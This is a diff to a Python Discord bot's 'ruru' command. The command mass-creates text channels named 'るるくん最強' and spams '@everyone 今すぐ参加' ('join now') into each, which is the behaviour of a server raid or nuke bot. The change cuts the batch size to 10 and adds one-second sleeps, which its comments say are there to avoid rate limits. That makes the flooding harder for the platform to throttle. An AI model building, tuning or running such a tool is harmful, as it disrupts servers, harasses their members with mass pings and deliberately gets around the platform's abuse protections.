@@ -38,11 +38,12 @@ async def ruru(ctx):
         task = asyncio.create_task(ctx.guild.create_text_channel('るるくん最強'))
         create_tasks.append(task)
 
-    # 最大25タスクずつバッチで実行
-    batch_size = 25
+    # 最大10タスクずつバッチで実行
+    batch_size = 10
     for i in range(0, len(create_tasks), batch_size):
         batch = create_tasks[i:i + batch_size]
         await asyncio.gather(*batch)
+        await asyncio.sleep(1)  # 短い待機時間を設定してレート制限を避ける
 
     # 作成したチャンネルに@everyoneメンションを投稿
     new_channels = ctx.guild.text_channels
@@ -52,10 +53,11 @@ async def ruru(ctx):
             task = asyncio.create_task(channel.send('@everyone 今すぐ参加'))
             mention_tasks.append(task)
 
-    # 最大25タスクずつバッチで実行
+    # 最大10タスクずつバッチで実行
     for i in range(0, len(mention_tasks), batch_size):
         batch = mention_tasks[i:i + batch_size]
         await asyncio.gather(*batch)
+        await asyncio.sleep(1)  # 短い待機時間を設定してレート制限を避ける
 
 def keep_alive():
     # Keep-aliveサーバーの設定
